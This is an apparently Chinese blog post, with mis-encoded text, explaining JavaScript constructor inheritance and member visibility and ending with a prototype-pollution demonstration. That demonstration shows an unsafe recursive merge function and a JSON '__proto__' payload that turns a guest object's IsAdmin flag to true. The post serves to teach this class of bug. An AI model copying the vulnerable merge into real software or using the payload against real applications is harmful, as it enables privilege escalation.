???è¯·çœ‹ä¸‹ä¾‹ 123456789101112131415161718function o1() { this.o1 = 1;}function o2() { o1.call(this); this.o2 = 2;}o2.prototype = new o1;function o3() { o2.call(this); this.o3 = 3;}o3.prototype = new o2;let test = new o3;console.log(test.constructor == o3); è¯·çŒœçŒœæœ€åè¾“å‡ºä»€ä¹ˆï¼Ÿæœ€å¼€å§‹æˆ‘è®¤ä¸ºå¯¹è±¡çš„constructoråº”è¯¥æŒ‡å‘è‡ªå·±çš„æ„é€ å‡½æ•°ï¼Œæ‰€ä»¥åº”è¯¥æ˜¯trueï¼Ÿä½†è¿™æ˜¯ä¸å¯¹çš„ï¼Œæ˜¯falseï¼construstorå±æ€§ä¹Ÿæ˜¯å¯ä»¥ç»§æ‰¿çš„ï¼Œè¿™æ ·ä¸€å±‚ä¸€å±‚ç»§æ‰¿å¯¼è‡´o3ç»§æ‰¿äº†o1çš„construstoræˆ‘è¿™æ ·å†™ç»§æ‰¿æ˜¯é”™è¯¯çš„ï¼Œæ­£ç¡®çš„æ–¹æ³•åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œå°†åŸå‹çš„construstoré‡æ–°æŒ‡å‘è‡ªå·±çš„æ„é€ å‡½æ•°ã€‚ 123456789101112131415161718192021222324function o1() { this.o1 = 1;}function o2() { o1.call(this); this.o2 = 2;}o2.prototype = new o1;o2.prototype.constructor = o2;function o3() { o2.call(this); this.o3 = 3;}o3.prototype = new o2;o3.prototype.constructor = o3;let test = new o3;console.log(test.constructor == o1); //falseconsole.log(test.constructor == o3); //true æˆå‘˜å±æ€§privateå¯¹äºprivateå±æ€§çš„æˆå‘˜æ¥è¯´æ¥è¯´ï¼Œå®ƒåªå¯ä»¥åœ¨æ„é€ å‡½æ•°å†…éƒ¨ä½¿ç”¨çš„æ—¶å€™è¿›è¡Œè®¿é—®ã€‚æ ¹æ®letå…³é”®è¯çš„ç‰¹æ€§ï¼ˆä¸ä¼šå˜é‡æå‡ï¼Œå¯ä»¥åªåœ¨å—çº§ä½œç”¨åŸŸä½œç”¨ç­‰ï¼‰ï¼Œå®ƒå¯ä»¥ä½œä¸ºprivateä½¿ç”¨ã€‚åŒæ—¶ï¼Œå¯¹äºç§æœ‰çš„æ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥å¥—å¨ƒå®ç°ã€‚è¿™æ ·çš„å‡½æ•°æ— æ³•è¢«å®ä¾‹åŒ–çš„å¯¹è±¡è°ƒç”¨ï¼Œä¹Ÿä¸ä¼šè¢«ç»§æ‰¿ã€‚å¦‚æœå®ƒå¯ä»¥è¢«å¤–éƒ¨è®¿é—®ï¼Œé‚£å®ƒå‡†ç¡®æ¥è¯´æ˜¯ä¸€ä¸ªprotectedå±æ€§ã€‚ 12345678910111213141516171819202122232425262728function TheFather() { let a = 1; function private_1() { console.log(\"I am private!\"); return a; }}function son1() { let b = 2; function private_1() { console.log(\"I am private!\"); return b; }}son1.prototype = new TheFather;son1.prototype.constructor = son1;let test1 = new TheFather;//console.log(test1.a); //undefined//console.log(test1.private_1()); //errorlet test2 = new son1;//console.log(test2.a); //undefined//console.log(test2.private_1()); //error//console.log(test2.private_2()); //error publicå¯¹äºpublicå¯¹è±¡ï¼Œå®ƒæ˜¯å¯ä»¥è¢«å¤–éƒ¨è®¿é—®ï¼Œä¹Ÿå¯ä»¥è¢«ç»§æ‰¿çš„ã€‚æˆ‘ä»¬åªéœ€è¦ç”¨thiså°±å¯ä»¥äº† 1234567891011121314151617181920212223242526272829303132function TheFather() { this.a = 1; this.public_1 = function() { return this.a; }}TheFather.prototype.public_2 = function() { return this.a;}function son1() { this.b = 2; this.public_3 = function() { return this.b; }}son1.prototype = new TheFather;son1.prototype.constructor = son1;let test1 = new TheFather;//console.log(test1.a); //1//console.log(test1.public_1()); //1//console.log(test1.public_2()); //1let test2 = new son1;//console.log(test2.a); //1//console.log(test2.b); //2//console.log(test2.public_1()); //1//console.log(test2.public_2()); //1//console.log(test2.public_3()); //2 prototypeå¯¹äºprototypeï¼Œæˆ‘ä»¬è¦è®©åªæœ‰å®ä¾‹åŒ–çš„å¯¹è±¡å’Œå­ç±»çš„å¯¹è±¡å¯ä»¥è®¿é—®å®ƒã€‚æˆ‘ä»¬æ²¡æœ‰å…·ä½“å®ç°çš„æ–¹æ³•ï¼Œå¯ä»¥å°†privateå±æ€§å˜å¾—å¯ä»¥è®¿é—®å³å¯ã€‚å¯ä»¥ä½¿ç”¨ä¸€ä¸ªå…¬ç”¨å‡½æ•°è®¿é—®å®ƒã€‚ 1234567891011121314151617181920212223242526function TheFather() { let a = 1; this.private_1 = function() { return a; }}function son1() { let b = 2; this.private_2 = function() { return b; }}son1.prototype = new TheFather;son1.prototype.constructor = son1;let test1 = new TheFather;//console.log(test1.a); //undefined//console.log(test1.private_1()); //1let test2 = new son1;//console.log(test2.a); //undefined//console.log(test2.private_1()); //error//console.log(test2.private_2()); //error åŸå‹é“¾æ±¡æŸ“å› ä¸ºjsçš„å¯¹è±¡ç»§æ‰¿æ˜¯åŸºäºåŸå‹é“¾çš„ï¼Œæ‰€ä»¥å¦‚æœæŠŠä¸Šä¸€å±‚çš„åŸå‹æ±¡æŸ“äº†å°±ä¼šå¯¼è‡´ä¸‹å±‚çš„å±æ€§è¢«æ±¡æŸ“ã€‚ä¸¾ä¸ªä¾‹å­ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253//åˆ¤æ–­æ˜¯å¦ä¸ºä¸€ä¸ªå¯¹è±¡function isObject(a) { if(typeof(a) == \"object\") { return true; } else { return false; }}//å¯¹è±¡å¤åˆ¶function merge(a, b) { for (var attr in b) { if(isObject(a[attr]) &amp;&amp; isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a}//userçˆ¶çº§å¯¹è±¡ï¼Œæœ‰ä¸€ä¸ªåˆ¤æ–­æ˜¯å¦ä¸ºadminçš„å±æ€§function user() { this.IsAdmin = false;};//æ¸¸å®¢å¯¹è±¡ï¼Œç»§æ‰¿userï¼ŒIsAdminé»˜è®¤ä¸ºFalsefunction guest() { this.check = function() { console.log(\"I am guest\"); };};guest.prototype = new user;//ç®¡ç†å‘˜å¯¹è±¡ï¼Œç»§æ‰¿userï¼ŒIsAdminä¿®æ”¹ä¸ºTruefunction admin() { this.check = function() { console.log(\"I am admin\"); };};admin.prototype = new user;admin.prototype.IsAdmin = true;let P1 = new guest;let P2 = new admin;console.log(P1.IsAdmin); //falseconsole.log(P2.IsAdmin); //true//å‡è®¾è¿™é‡Œå¯ä»¥æ§åˆ¶jsonï¼Œæäº¤ä»¥ä¸‹æ•°æ®æ±¡æŸ“åŸå‹userlet o1 = JSON.parse('{\"__proto__\":{\"IsAdmin\":true}}');merge(P1, o1);console.log(P1.IsAdmin); //true","link":"/2020/07/01/js%E7%9A%84%E7%BB%A7%E6%89%BF%E4%B8%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}],"tags":[{"name":"javascipt","slug":"javascipt","link":"/tags/javascipt/"},{"name":"å¯¹è±¡","slug":"å¯¹è±¡","link":"/tags/%E5%AF%B9%E8%B1%A1/"},{"name":"ç»§æ‰¿","slug":"ç»§æ‰¿","link":"/tags/%E7%BB%A7%E6%89%BF/"},{"name":"åŸå‹é“¾æ±¡æŸ“","slug":"åŸå‹é“¾æ±¡æŸ“","link":"/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"}],"categories":[]}